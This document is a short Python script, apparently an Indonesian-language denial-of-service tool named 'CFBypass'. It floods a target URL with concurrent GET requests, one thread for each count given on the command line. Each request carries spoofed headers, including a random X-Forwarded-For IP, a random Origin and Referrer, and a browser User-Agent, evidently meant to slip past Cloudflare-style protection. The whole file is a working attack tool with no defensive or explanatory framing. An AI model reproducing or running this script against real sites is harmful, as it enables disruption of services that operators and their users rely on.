import requests
import random
import time
import threading
import os
import sys

def random_string(length):
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(characters) for _ in range(length))

def random_ip():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def main(url, waktu):
    if len(sys.argv) <= 2:
        print("Penggunaan: python bsv.py <url> <waktu>")
        sys.exit(-1)

    def kirim_pengiriman():
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Upgrade-Insecure-Requests': 1,
            'cookie': 'cookie_value',
            'Origin': f"http://{random_string(10)}.com",
            'Referrer': f"http://google.com/{random_string(10)}",
            'X-Forwarded-For': random_ip()
        }
        requests.get(url, headers=headers)

    benangs = []
    for _ in range(int(waktu)):
        benang = threading.Thread(target=kirim_pengiriman)
        benang.start()
        benangs.append(benang)

    for benang in benangs:
        benang.join()

    print("CFBypass selesai.")

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])
